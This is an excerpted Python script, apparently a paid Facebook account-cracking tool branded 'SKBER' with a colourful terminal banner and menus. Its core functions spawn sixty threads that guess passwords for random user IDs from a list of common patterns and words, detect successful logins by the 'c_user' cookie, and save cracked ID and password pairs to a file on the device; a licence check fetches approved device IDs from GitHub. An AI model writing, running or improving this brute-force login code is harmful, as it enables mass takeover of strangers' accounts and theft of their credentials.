...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; JAHID HASSAN \x07')
...
..######..##....##.########..########.##.....##                                             
\x1b[1;97m ---------------------------------------------
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   : \x1b[1;92mMD Jãhīd
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook: \x1b[1;92mMd Jáhìd
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Status  : \x1b[1;92mPaid
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool    : \x1b[1;92mRandom
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Version : \x1b[1;92m0.2
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100086415663015');time.sleep(1)
		fb()
	if opt in ["D","4"]:
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/FB-KO');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/SKBER-CYBER');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you', 'bangladesh','sadiya', 'samiya', 'sumaiya', 'khadija']
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;92mSS-BRO\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'sec-ch-ua-platform-version': '"Android"',
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [SKBER-OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SKBER-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/sajjadsordar/Sajjad/blob/main/Sordar.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100086415663015")
        time.sleep(3.0)
